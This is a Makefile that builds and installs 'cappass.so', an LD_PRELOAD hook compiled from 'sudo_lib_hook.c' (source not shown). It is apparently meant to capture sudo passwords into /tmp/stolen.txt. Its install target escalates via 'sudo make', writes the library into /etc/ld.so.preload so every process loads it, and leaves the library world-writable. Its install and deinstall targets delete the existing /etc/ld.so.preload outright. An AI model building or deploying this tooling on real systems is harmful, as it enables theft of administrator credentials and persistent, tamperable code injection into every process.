# Define the C compiler and flags
CC = gcc
CFLAGS = -Wall -fPIC
LDFLAGS = -shared
PROG = cappass.so
SOURCES = sudo_lib_hook.c
OBJECTS = $(SOURCES:.c=.o)
LIBS = -ldl
UID = id -u
DEL = rm -f
TOUCH = touch
COPY = cp
PERMS = chmod
ECHO = echo
RAISE = sudo make
LDSOPRE = /etc/ld.so.preload
INSTLOC = /tmp
PASSFILE = stolen.txt
LIBLOC = $(INSTLOC)/$(PROG)
PFLOC = $(INSTLOC)/$(PASSFILE)

all: $(PROG)

$(PROG): $(OBJECTS)
	$(CC) $(LIBS) $(LDFLAGS)  $^ -o $@

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@


# Phony target for cleaning up generated files

.PHONY: uninstall deinstall
.PHONY: clean

clean:
    ifneq ($(shell $(UID)), 0)
	$(RAISE) $@
    else
	$(DEL) $(PROG) $(PFLOC) $(OBJECTS)
    endif

install: all
    ifneq ($(shell $(UID)), 0)
	$(RAISE) $@
    else
	$(DEL) $(LIBLOC) $(LDSOPRE) $(PFLOC)
	$(COPY) $(PROG) $(LIBLOC)
	$(PERMS) 666 $(LIBLOC)
	$(TOUCH) $(PFLOC)
	$(PERMS) 644 $(PFLOC)
	$(ECHO) $(LIBLOC) >> $(LDSOPRE)
   endif

deinstall: all
    ifneq ($(shell $(UID)), 0)
	$(RAISE) $@
    else
	$(DEL) $(LIBLOC) $(LDSOPRE) $(PFLOC)
    endif

uninstall: deinstall

